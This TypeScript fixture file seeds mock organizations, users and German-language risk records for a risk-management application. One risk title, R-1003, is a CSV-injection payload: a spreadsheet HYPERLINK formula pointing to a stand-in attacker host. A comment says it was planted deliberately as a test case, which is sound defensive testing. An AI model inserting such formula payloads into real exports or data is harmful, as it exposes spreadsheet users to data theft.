import type { Organization, Risk, User } from '../domain';

export const organizations: Organization[] = [
  { id: 'org-a', name: 'Nordwind AG' },
  { id: 'org-b', name: 'Südstern GmbH' },
];

export const users: User[] = [
  { id: 'u-anna', displayName: 'Anna Becker', email: 'anna.becker@org-a.example', orgId: 'org-a', roles: ['risk_manager'] },
  { id: 'u-tom', displayName: 'Tom Vogel', email: 'tom.vogel@org-a.example', orgId: 'org-a', roles: ['risk_owner'] },
  { id: 'u-max', displayName: 'Max Frey', email: 'max.frey@org-a.example', orgId: 'org-a', roles: ['viewer'] },
  { id: 'u-sara', displayName: 'Sara Klein', email: 'sara.klein@org-b.example', orgId: 'org-b', roles: ['auditor'] },
];

function risk(r: Omit<Risk, 'score'>): Risk {
  return { ...r, score: r.probability * r.impact };
}

export const risks: Risk[] = [
  // --- Organization A (Nordwind AG) ---
  risk({ id: 'R-1001', orgId: 'org-a', title: 'Lieferantenausfall Cloud-Hosting', category: 'Operational', status: 'open', probability: 4, impact: 5, ownerId: 'u-tom', createdAt: '2026-01-12', updatedAt: '2026-05-03', internalNotes: 'Vertraulich: Vertragsstrafe mit Anbieter noch ungeklärt.' }),
  risk({ id: 'R-1002', orgId: 'org-a', title: 'Phishing-Anfälligkeit Mitarbeiter', category: 'Security', status: 'open', probability: 3, impact: 4, ownerId: 'u-anna', createdAt: '2026-02-01', updatedAt: '2026-05-20', internalNotes: 'Vertraulich: 3 Klicks in letzter Awareness-Kampagne.' }),
  risk({ id: 'R-1003', orgId: 'org-a', title: '=HYPERLINK("http://evil.example/steal","Quartalsbericht")', category: 'Security', status: 'open', probability: 2, impact: 5, ownerId: 'u-tom', createdAt: '2026-02-15', updatedAt: '2026-06-01', internalNotes: 'Vertraulich: bewusst als CSV-Injection-Beispiel angelegt.' }),
  risk({ id: 'R-1004', orgId: 'org-a', title: 'Wechselkursvolatilität USD', category: 'Financial', status: 'mitigated', probability: 3, impact: 3, ownerId: 'u-anna', createdAt: '2026-01-20', updatedAt: '2026-04-11', internalNotes: 'Vertraulich: Hedging-Position bei Hausbank.' }),
  risk({ id: 'R-1005', orgId: 'org-a', title: 'DSGVO-Verstoß Auftragsverarbeitung', category: 'Compliance', status: 'open', probability: 2, impact: 5, ownerId: 'u-anna', createdAt: '2026-03-03', updatedAt: '2026-05-28', internalNotes: 'Vertraulich: AVV mit Subdienstleister fehlt.' }),
  risk({ id: 'R-1006', orgId: 'org-a', title: 'Ausfall Zahlungsdienstleister', category: 'Operational', status: 'accepted', probability: 2, impact: 4, ownerId: 'u-tom', createdAt: '2026-02-09', updatedAt: '2026-03-30', internalNotes: 'Vertraulich: Fallback-Anbieter evaluiert.' }),
  risk({ id: 'R-1007', orgId: 'org-a', title: 'Veraltete TLS-Konfiguration', category: 'Security', status: 'mitigated', probability: 3, impact: 3, ownerId: 'u-tom', createdAt: '2026-01-30', updatedAt: '2026-04-22', internalNotes: 'Vertraulich: TLS 1.0 auf Altsystem noch aktiv.' }),
  risk({ id: 'R-1008', orgId: 'org-a', title: 'Liquiditätsengpass Q4', category: 'Financial', status: 'open', probability: 3, impact: 5, ownerId: 'u-anna', createdAt: '2026-03-18', updatedAt: '2026-06-10', internalNotes: 'Vertraulich: Kreditlinie wird neu verhandelt.' }),
  risk({ id: 'R-1009', orgId: 'org-a', title: 'Fehlende Notfalldokumentation', category: 'Operational', status: 'closed', probability: 1, impact: 3, ownerId: 'u-tom', createdAt: '2026-01-05', updatedAt: '2026-02-28', internalNotes: 'Vertraulich: Runbook im April nachgereicht.' }),

  // --- Organization B (Südstern GmbH) ---
  risk({ id: 'R-2001', orgId: 'org-b', title: 'Serverraum-Klimaausfall', category: 'Operational', status: 'open', probability: 3, impact: 4, ownerId: 'u-sara', createdAt: '2026-02-11', updatedAt: '2026-05-15', internalNotes: 'Vertraulich: Wartungsvertrag Klimaanlage abgelaufen.' }),
  risk({ id: 'R-2002', orgId: 'org-b', title: 'Insider-Datenexfiltration', category: 'Security', status: 'open', probability: 2, impact: 5, ownerId: 'u-sara', createdAt: '2026-03-01', updatedAt: '2026-06-05', internalNotes: 'Vertraulich: DLP-Regeln noch nicht scharf geschaltet.' }),
  risk({ id: 'R-2003', orgId: 'org-b', title: 'Steuerliche Nachforderung', category: 'Financial', status: 'mitigated', probability: 2, impact: 4, ownerId: 'u-sara', createdAt: '2026-01-25', updatedAt: '2026-04-09', internalNotes: 'Vertraulich: Rückstellung gebildet.' }),
  risk({ id: 'R-2004', orgId: 'org-b', title: 'Unvollständige Lieferantenprüfung', category: 'Compliance', status: 'open', probability: 3, impact: 3, ownerId: 'u-sara', createdAt: '2026-02-19', updatedAt: '2026-05-02', internalNotes: 'Vertraulich: Sanktionslistenabgleich offen.' }),
  risk({ id: 'R-2005', orgId: 'org-b', title: 'Ransomware über E-Mail-Anhang', category: 'Security', status: 'open', probability: 4, impact: 5, ownerId: 'u-sara', createdAt: '2026-03-12', updatedAt: '2026-06-18', internalNotes: 'Vertraulich: Backup-Restore zuletzt 2025 getestet.' }),
  risk({ id: 'R-2006', orgId: 'org-b', title: 'Vertragsstrafe SLA-Verletzung', category: 'Financial', status: 'accepted', probability: 2, impact: 3, ownerId: 'u-sara', createdAt: '2026-01-15', updatedAt: '2026-03-22', internalNotes: 'Vertraulich: Pönale im Q1 angefallen.' }),
];

export function findUser(id: string): User | undefined {
  return users.find((u) => u.id === id);
}
